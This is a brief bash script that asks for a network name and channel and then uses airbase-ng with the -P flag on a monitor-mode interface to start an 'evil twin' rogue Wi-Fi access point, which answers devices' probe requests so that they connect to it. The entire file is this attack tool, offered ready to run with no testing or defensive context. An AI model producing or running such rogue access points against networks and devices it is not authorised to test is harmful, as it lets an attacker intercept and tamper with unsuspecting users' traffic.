#!/bin/bash

echo "What is the ESSID (what do you want it to be named)"
read -r essid
echo "What is the channel"
read -r channel

echo "Starting the twin :)"
airbase-ng -e $essid -c $channel -P wlan0mon
